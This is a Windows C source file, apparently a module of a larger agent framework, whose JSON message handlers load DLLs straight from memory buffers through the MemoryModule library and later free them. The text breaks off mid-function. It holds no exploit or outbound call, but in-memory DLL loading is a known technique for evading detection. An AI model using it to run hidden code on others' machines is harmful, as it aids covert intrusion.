#include <windows.h>
#include <stdio.h>

#pragma message( "Compiling with DEBUGGING messages hardcoded in " __FILE__ )
#define _VERBOSE
#define DEBUG_LEVEL DEBUG_VERBOSE
#include "DebugOutput.h"
#include "LIB_Utilities.h"
#include "cJSON.h"

#include "LIB_LoaderMemoryModule.h"
#include "MemoryModule.h"


// Global variables
cJSON* g_LoaderMemoryModule_lpJsonLoaderMemoryModuleConfig = NULL;


DWORD WINAPI LoaderMemoryModuleInitialization(
	IN	PBYTE	lpInputBuffer,
	IN	DWORD	dwInputBufferSize,
	OUT PBYTE*	lppOutputBuffer,
	OUT PDWORD	lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	cJSON*	lpJsonLoaderMemoryModuleInitializeInput = NULL;

	BOOL	bRegisterResult = FALSE;

	PBYTE	pBuffer = NULL;
	int		nBufferSize = 0;

	cJSON*	lpJsonLoaderMemoryModuleInitializeOutput = NULL;
	CHAR*	szLoaderMemoryModuleOutput = NULL;
	DWORD	dwLoaderMemoryModuleOutputSize = 0;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			//if (NULL == lppOutputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lppOutputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			if (NULL == lpInputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpInputBuffer is NULL.\n")
				);
				__leave;
			}


			/********************************************************************************
				Convert input string into JSON
			********************************************************************************/
			lpJsonLoaderMemoryModuleInitializeInput = cJSON_Parse((CHAR*)lpInputBuffer);
			if (NULL == lpJsonLoaderMemoryModuleInitializeInput)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Parse(%p) failed."),
					(CHAR*)lpInputBuffer
				);
				__leave;
			}

			// Set the local module's configuration to the input configuration
			g_LoaderMemoryModule_lpJsonLoaderMemoryModuleConfig = lpJsonLoaderMemoryModuleInitializeInput;
			// and then null the input configuration so it isn't free'd in the finally
			lpJsonLoaderMemoryModuleInitializeInput = NULL;


			/********************************************************************************
				Initialize internal functions
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("InitializeLoaderFunctions()"));
			//dwErrorCode = InitializeLoaderFunctions();
			//if (ERROR_SUCCESS != dwErrorCode)
			//{
			//	DBGPRINT(DEBUG_ERROR, TEXT("InitializeLoaderFunctions() failed.(%08x)"), dwErrorCode);
			//	__leave;
			//}


			/********************************************************************************
				Perform additional initialization actions
			********************************************************************************/


			/********************************************************************************
				Register callback functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Register LoaderMemoryModule_LoadLibrary_Request"));
			bRegisterResult = RegisterModuleMessageHandler(
				g_LoaderMemoryModule_lpJsonLoaderMemoryModuleConfig,
				LoaderMemoryModule_LoadLibrary_Request,
				LoaderMemoryModuleLoadLibrary
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("RegisterModuleMessageHandler(%p, %S, %p) failed."),
					g_LoaderMemoryModule_lpJsonLoaderMemoryModuleConfig,
					LoaderMemoryModule_LoadLibrary_Request,
					LoaderMemoryModuleLoadLibrary
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Register LoaderMemoryModule_LoadLibrary_Request was successful."));
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("Register LoaderMemoryModule_FreeLibrary_Request"));
			bRegisterResult = RegisterModuleMessageHandler(
				g_LoaderMemoryModule_lpJsonLoaderMemoryModuleConfig,
				LoaderMemoryModule_FreeLibrary_Request,
				LoaderMemoryModuleFreeLibrary
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("RegisterModuleMessageHandler(%p, %S, %p) failed."),
					g_LoaderMemoryModule_lpJsonLoaderMemoryModuleConfig,
					LoaderMemoryModule_FreeLibrary_Request,
					LoaderMemoryModuleFreeLibrary
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Register LoaderMemoryModule_FreeLibrary_Request was successful."));
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("Register LoaderMemoryModule_GetProcAddr_Request"));
			bRegisterResult = RegisterModuleMessageHandler(
				g_LoaderMemoryModule_lpJsonLoaderMemoryModuleConfig,
				LoaderMemoryModule_GetProcAddr_Request,
				LoaderMemoryModuleGetProcAddr
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("RegisterModuleMessageHandler(%p, %S, %p) failed."),
					g_LoaderMemoryModule_lpJsonLoaderMemoryModuleConfig,
					LoaderMemoryModule_GetProcAddr_Request,
					LoaderMemoryModuleGetProcAddr
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Register LoaderMemoryModule_GetProcAddr_Request was successful."));
			}



			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			//szJsonOutput = cJSON_Print(lpJsonOutput);
			//if (NULL == szJsonOutput)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("cJSON_Print(%p) failed."),
			//		lpJsonOutput
			//	);
			//	__leave;
			//}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szJsonOutput:     %p"), szJsonOutput);
			////printf("szJsonOutput:\n%s\n", szJsonOutput);
			//dwJsonOutputSize = (DWORD)strlen(szJsonOutput);

			//(*lppOutputBuffer) = (LPBYTE)szJsonOutput;
			//(*lpdwOutputBufferSize) = dwJsonOutputSize;

		} // end try-finally
		__finally
		{
			// Delete input and output JSON objects
			if (NULL != lpJsonLoaderMemoryModuleInitializeInput)
			{
				cJSON_Delete(lpJsonLoaderMemoryModuleInitializeInput);
				lpJsonLoaderMemoryModuleInitializeInput = NULL;
			}
			if (NULL != lpJsonLoaderMemoryModuleInitializeOutput)
			{
				cJSON_Delete(lpJsonLoaderMemoryModuleInitializeOutput);
				lpJsonLoaderMemoryModuleInitializeOutput = NULL;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI LoaderMemoryModuleFinalization(
	IN	PBYTE	lpInputBuffer,
	IN	DWORD	dwInputBufferSize,
	OUT PBYTE*	lppOutputBuffer,
	OUT PDWORD	lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szLoaderMemoryModuleInput = NULL;
	DWORD	dwLoaderMemoryModuleInputSize = 0;
	cJSON*	lpJsonLoaderMemoryModuleInput = NULL;
	cJSON*	lpJsonMessageType = NULL;

	BOOL	bRegisterResult = FALSE;

	PBYTE	pBuffer = NULL;
	int		nBufferSize = 0;

	CHAR*	szLoaderMemoryModuleOutput = NULL;
	DWORD	dwLoaderMemoryModuleOutputSize = 0;
	cJSON*	lpJsonLoaderMemoryModuleOutput = NULL;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			//if (NULL == lppOutputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lppOutputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//if (NULL == lpInputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpInputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//szJsonInput = (char*)lpInputBuffer;
			//dwJsonInputSize = dwInputBufferSize;

			/********************************************************************************
				Unregister callback functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister LoaderMemoryModule_LoadLibrary_Request"));
			bRegisterResult = UnregisterModuleMessageHandler(
				g_LoaderMemoryModule_lpJsonLoaderMemoryModuleConfig,
				LoaderMemoryModule_LoadLibrary_Request
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("UnregisterModuleMessageHandler(%p, %S) failed."),
					g_LoaderMemoryModule_lpJsonLoaderMemoryModuleConfig,
					LoaderMemoryModule_LoadLibrary_Request
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister LoaderMemoryModule_LoadLibrary_Request was successful."));
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister LoaderMemoryModule_FreeLibrary_Request"));
			bRegisterResult = UnregisterModuleMessageHandler(
				g_LoaderMemoryModule_lpJsonLoaderMemoryModuleConfig,
				LoaderMemoryModule_FreeLibrary_Request
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("UnregisterModuleMessageHandler(%p, %S) failed."),
					g_LoaderMemoryModule_lpJsonLoaderMemoryModuleConfig,
					LoaderMemoryModule_FreeLibrary_Request
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister LoaderMemoryModule_FreeLibrary_Request was successful."));
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister LoaderMemoryModule_GetProcAddr_Request"));
			bRegisterResult = UnregisterModuleMessageHandler(
				g_LoaderMemoryModule_lpJsonLoaderMemoryModuleConfig,
				LoaderMemoryModule_GetProcAddr_Request
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("UnregisterModuleMessageHandler(%p, %S) failed."),
					g_LoaderMemoryModule_lpJsonLoaderMemoryModuleConfig,
					LoaderMemoryModule_GetProcAddr_Request
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister LoaderMemoryModule_GetProcAddr_Request was successful."));
			}

			/********************************************************************************
				Perform additional Finalization actions
			********************************************************************************/


			/********************************************************************************
				Finalize internal functions
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("FinalizeLoaderFunctions()"));
			//dwErrorCode = FinalizeLoaderFunctions();
			//if (ERROR_SUCCESS != dwErrorCode)
			//{
			//	DBGPRINT(DEBUG_ERROR, TEXT("FinalizeLoaderFunctions() failed.(%08x)"), dwErrorCode);
			//	__leave;
			//}


		} // end try-finally
		__finally
		{
			/********************************************************************************
				Delete local JSON config
			********************************************************************************/
			if (NULL != g_LoaderMemoryModule_lpJsonLoaderMemoryModuleConfig)
			{
				cJSON_Delete(g_LoaderMemoryModule_lpJsonLoaderMemoryModuleConfig);
				g_LoaderMemoryModule_lpJsonLoaderMemoryModuleConfig = NULL;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI LoaderMemoryModuleLoadLibrary(
	IN LPBYTE	lpInputBuffer,
	IN DWORD	dwInputBufferSize,
	OUT LPBYTE* lppOutputBuffer,
	OUT LPDWORD lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szLoaderMemoryModuleInput = NULL;
	DWORD	dwLoaderMemoryModuleInputSize = 0;
	cJSON*	lpJsonLoaderMemoryModuleInput = NULL;
	cJSON*	lpJsonLoaderMemoryModuleLoadLibraryRequest = NULL;
	cJSON*	lpJsonLoaderMemoryModuleLoadLibraryRequestLibraryBuffer = NULL;

	LPBYTE	lpDllFileBuffer = NULL;
	DWORD	dwDllFileBufferSize = 0;

	HMEMORYMODULE hMemoryModule = NULL;

	CHAR*	szLoaderMemoryModuleOutput = NULL;
	DWORD	dwLoaderMemoryModuleOutputSize = 0;
	cJSON*	lpJsonLoaderMemoryModuleOutput = NULL;
	//cJSON*	lpJsonLoaderMemoryModuleResponse = NULL;
	cJSON*	lpJsonLoaderMemoryModuleResponseModuleHandle = NULL;

	
	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			if (NULL == lppOutputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lppOutputBuffer is NULL.\n")
				);
				__leave;
			}
			if (NULL == lpInputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpInputBuffer is NULL.\n")
				);
				__leave;
			}
			szLoaderMemoryModuleInput = (char*)lpInputBuffer;
			dwLoaderMemoryModuleInputSize = dwInputBufferSize;


			/********************************************************************************
				Parse input arguments
			********************************************************************************/
			lpJsonLoaderMemoryModuleInput = cJSON_Parse(szLoaderMemoryModuleInput);
			if (NULL == lpJsonLoaderMemoryModuleInput)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Parse(%p) failed."),
					lpInputBuffer
				);
				__leave;
			}


			/********************************************************************************
				Create the output JSON object
			********************************************************************************/
			// Create a response JSON object
			lpJsonLoaderMemoryModuleOutput = cJSON_CreateObject();
			if (NULL == lpJsonLoaderMemoryModuleOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonLoaderMemoryModuleOutput = cJSON_CreateObject failed.\n")
				);
				__leave;
			}
			
			//// Create the LoaderMemoryModule_LoadLibrary_Response JSON object
			//lpJsonLoaderMemoryModuleResponse = cJSON_AddObjectToObject(lpJsonLoaderMemoryModuleOutput, LoaderMemoryModule_LoadLibrary_Response);
			//if (NULL == lpJsonLoaderMemoryModuleResponse)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpJsonLoaderMemoryModuleResponse = cJSON_AddObjectToObject(%p, %S) failed.\n"),
			//		lpJsonLoaderMemoryModuleOutput, LoaderMemoryModule_LoadLibrary_Response
			//	);
			//	__leave;
			//}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonLoaderMemoryModuleResponse:    %p"), lpJsonLoaderMemoryModuleResponse);



			/********************************************************************************
				Perform action given input parameters
			********************************************************************************/
			// Get the LoaderMemoryModule_LoadLibrary_Request object
			lpJsonLoaderMemoryModuleLoadLibraryRequest = cJSON_GetObjectItemCaseSensitive(lpJsonLoaderMemoryModuleInput, LoaderMemoryModule_LoadLibrary_Request);
			if (NULL == lpJsonLoaderMemoryModuleLoadLibraryRequest)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonLoaderMemoryModuleInput,
					LoaderMemoryModule_LoadLibrary_Request
				);
				__leave;
			}

			// Get the library buffer
			lpJsonLoaderMemoryModuleLoadLibraryRequestLibraryBuffer = cJSON_GetObjectItemCaseSensitive(lpJsonLoaderMemoryModuleLoadLibraryRequest, LoaderMemoryModule_LoadLibrary_LibraryBuffer);
			if (NULL == lpJsonLoaderMemoryModuleLoadLibraryRequestLibraryBuffer)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonLoaderMemoryModuleLoadLibraryRequestLibraryBuffer = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonLoaderMemoryModuleLoadLibraryRequest,
					LoaderMemoryModule_LoadLibrary_LibraryBuffer
				);
				__leave;
			}
			if (
				(!cJSON_IsBytes(lpJsonLoaderMemoryModuleLoadLibraryRequestLibraryBuffer)) ||
				(NULL == lpJsonLoaderMemoryModuleLoadLibraryRequestLibraryBuffer->valuestring)
				)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsBytes(%p) failed."),
					lpJsonLoaderMemoryModuleLoadLibraryRequestLibraryBuffer
				);
				__leave;
			}

			lpDllFileBuffer = cJSON_GetBytesValue(lpJsonLoaderMemoryModuleLoadLibraryRequestLibraryBuffer, (int*)(&dwDllFileBufferSize));
			if (NULL == lpDllFileBuffer)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpDllFileBuffer = cJSON_GetBytesValue(%p, %p) failed."),
					lpJsonLoaderMemoryModuleLoadLibraryRequestLibraryBuffer,
					&dwDllFileBufferSize
				);
				__leave;
			}
				
			DBGPRINT(DEBUG_VERBOSE, TEXT("  ->%S:     %p"), LoaderMemoryModule_LoadLibrary_LibraryBuffer, lpDllFileBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("  ->%SSize: %d"), LoaderMemoryModule_LoadLibrary_LibraryBuffer, dwDllFileBufferSize);
			DBGPRINT(
				DEBUG_VERBOSE,
				TEXT("  ->%S:     %02x %02x %02x %02x"),
				LoaderMemoryModule_LoadLibrary_LibraryBuffer,
				lpDllFileBuffer[0],
				lpDllFileBuffer[1],
				lpDllFileBuffer[2],
				lpDllFileBuffer[3]
			);

			hMemoryModule = MemoryLoadLibrary(lpDllFileBuffer, dwDllFileBufferSize);
			if ( NULL == hMemoryModule )
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("MemoryLoaderMemoryModule( %p, %d ) failed. (%08x)\n"),
					lpDllFileBuffer, 
					dwDllFileBufferSize,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("hMemoryModule:        %p"), hMemoryModule);

			// Create the module handle output
			lpJsonLoaderMemoryModuleResponseModuleHandle = cJSON_CreateBytes((LPBYTE)(&hMemoryModule), sizeof(hMemoryModule));
			if (NULL == lpJsonLoaderMemoryModuleResponseModuleHandle)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonLoaderMemoryModuleResponseModuleHandle = cJSON_CreateBytes( %p, %d ) failed.\n"),
					(LPBYTE)(&hMemoryModule), sizeof(hMemoryModule)
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonLoaderMemoryModuleOutput, LoaderMemoryModule_LoadLibrary_ModuleHandle, lpJsonLoaderMemoryModuleResponseModuleHandle);

			// Free allocated buffer
			cJSON_free(lpDllFileBuffer);
			lpDllFileBuffer = NULL;


			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			szLoaderMemoryModuleOutput = cJSON_Print(lpJsonLoaderMemoryModuleOutput);
			if (NULL == szLoaderMemoryModuleOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Print(%p) failed."),
					lpJsonLoaderMemoryModuleOutput
				);
				__leave;
			}
			dwLoaderMemoryModuleOutputSize = (DWORD)strlen(szLoaderMemoryModuleOutput);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("dwLoaderMemoryModuleOutputSize: %d"), dwLoaderMemoryModuleOutputSize);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szLoaderMemoryModuleOutput:     %p"), szLoaderMemoryModuleOutput);
			//printf("szLoaderMemoryModuleOutput:\n%s\n", szLoaderMemoryModuleOutput);

			(*lppOutputBuffer) = (LPBYTE)szLoaderMemoryModuleOutput;
			(*lpdwOutputBufferSize) = dwLoaderMemoryModuleOutputSize;

		} // end try-finally
		__finally
		{
			if (NULL != lpJsonLoaderMemoryModuleInput)
			{
				cJSON_Delete(lpJsonLoaderMemoryModuleInput);
				lpJsonLoaderMemoryModuleInput = NULL;
			}

			if (NULL != lpJsonLoaderMemoryModuleOutput)
			{
				cJSON_Delete(lpJsonLoaderMemoryModuleOutput);
				lpJsonLoaderMemoryModuleOutput = NULL;
			}

			if (ERROR_SUCCESS != dwErrorCode)
			{
				if (NULL != (*lppOutputBuffer))
				{
					//dwTempErrorCode = FREE(*lppOutputBuffer);
					//if (ERROR_SUCCESS != dwTempErrorCode)
					//{
					//	DBGPRINT(DEBUG_ERROR, TEXT("FREE failed.(%08x)"), dwTempErrorCode);
					//}

					cJSON_free(szLoaderMemoryModuleOutput);
					*lppOutputBuffer = NULL;
				}
				*lpdwOutputBufferSize = 0;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI LoaderMemoryModuleFreeLibrary(
	IN LPBYTE	lpInputBuffer,
	IN DWORD	dwInputBufferSize,
	OUT LPBYTE* lppOutputBuffer,
	OUT LPDWORD lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szLoaderMemoryModuleInput = NULL;
	DWORD	dwLoaderMemoryModuleInputSize = 0;
	cJSON*	lpJsonLoaderMemoryModuleInput = NULL;
	cJSON*	lpJsonLoaderMemoryModuleFreeLibraryRequest = NULL;
	cJSON*	lpJsonLoaderMemoryModuleFreeLibraryRequestModuleHandle = NULL;

	LPBYTE	lpModulePointer = NULL;
	int		nModulePointerSize = 0;
	HMEMORYMODULE hMemoryModule = NULL;

	CHAR*	szLoaderMemoryModuleOutput = NULL;
	DWORD	dwLoaderMemoryModuleOutputSize = 0;
	cJSON*	lpJsonLoaderMemoryModuleOutput = NULL;
	//cJSON*	lpJsonLoaderMemoryModuleResponse = NULL;
	cJSON*	lpJsonLoaderMemoryModuleResponseResults = NULL;


	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			if (NULL == lppOutputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lppOutputBuffer is NULL.\n")
				);
				__leave;
			}
			if (NULL == lpInputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpInputBuffer is NULL.\n")
				);
				__leave;
			}
			szLoaderMemoryModuleInput = (char*)lpInputBuffer;
			dwLoaderMemoryModuleInputSize = dwInputBufferSize;


			/********************************************************************************
				Parse input arguments
			********************************************************************************/
			lpJsonLoaderMemoryModuleInput = cJSON_Parse(szLoaderMemoryModuleInput);
			if (NULL == lpJsonLoaderMemoryModuleInput)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Parse(%p) failed."),
					lpInputBuffer
				);
				__leave;
			}


			/********************************************************************************
				Create the output JSON object
			********************************************************************************/
			// Create a response JSON object
			lpJsonLoaderMemoryModuleOutput = cJSON_CreateObject();
			if (NULL == lpJsonLoaderMemoryModuleOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonLoaderMemoryModuleOutput = cJSON_CreateObject failed.\n")
				);
				__leave;
			}

			//// Create the TSM_SURVEY_QUERY_RESPONSE JSON object
			//lpJsonLoaderMemoryModuleResponse = cJSON_AddObjectToObject(lpJsonLoaderMemoryModuleOutput, LoaderMemoryModule_FreeLibrary_Response);
			//if (NULL == lpJsonLoaderMemoryModuleResponse)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpJsonLoaderMemoryModuleResponse = cJSON_AddObjectToObject(%p, %S) failed.\n"),
			//		lpJsonLoaderMemoryModuleOutput, LoaderMemoryModule_FreeLibrary_Response
			//	);
			//	__leave;
			//}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonLoaderMemoryModuleResponse:    %p"), lpJsonLoaderMemoryModuleResponse);


			/********************************************************************************
				Perform action given input parameters
			********************************************************************************/
			// Get the LoaderMemoryModule_FreeLibrary_Request object
			lpJsonLoaderMemoryModuleFreeLibraryRequest = cJSON_GetObjectItemCaseSensitive(lpJsonLoaderMemoryModuleInput, LoaderMemoryModule_FreeLibrary_Request);
			if (NULL == lpJsonLoaderMemoryModuleFreeLibraryRequest)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonLoaderMemoryModuleInput,
					LoaderMemoryModule_FreeLibrary_Request
				);
				__leave;
			}

			// Get the module handle
			lpJsonLoaderMemoryModuleFreeLibraryRequestModuleHandle = cJSON_GetObjectItemCaseSensitive(lpJsonLoaderMemoryModuleFreeLibraryRequest, LoaderMemoryModule_FreeLibrary_ModuleHandle);
			if (NULL == lpJsonLoaderMemoryModuleFreeLibraryRequestModuleHandle)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonLoaderMemoryModuleFreeLibraryRequestModuleHandle = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonLoaderMemoryModuleFreeLibraryRequest,
					LoaderMemoryModule_FreeLibrary_ModuleHandle
				);
				__leave;
			}
			if (
				(!cJSON_IsBytes(lpJsonLoaderMemoryModuleFreeLibraryRequestModuleHandle)) ||
				(NULL == lpJsonLoaderMemoryModuleFreeLibraryRequestModuleHandle->valuestring)
				)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsBytes(%p) failed."),
					lpJsonLoaderMemoryModuleFreeLibraryRequestModuleHandle
				);
				__leave;
			}

			lpModulePointer = cJSON_GetBytesValue(lpJsonLoaderMemoryModuleFreeLibraryRequestModuleHandle, (&nModulePointerSize));
			if (NULL == lpModulePointer)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpModulePointer = cJSON_GetBytesValue(%p, %p) failed."),
					lpJsonLoaderMemoryModuleFreeLibraryRequestModuleHandle,	(&nModulePointerSize)
				);
				__leave;
			}
			hMemoryModule = *(HMEMORYMODULE*)(lpModulePointer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("  ->%S:  %p"), LoaderMemoryModule_FreeLibrary_ModuleHandle, hMemoryModule);

			if (NULL == hMemoryModule)
			{
				dwErrorCode = ERROR_INVALID_HANDLE;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("hMemoryModule is invalid.\n")
				);
				__leave;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("MemoryFreeLibrary(%p)..."), hMemoryModule);
			MemoryFreeLibrary(
				hMemoryModule
			);

			// Create the JSON results
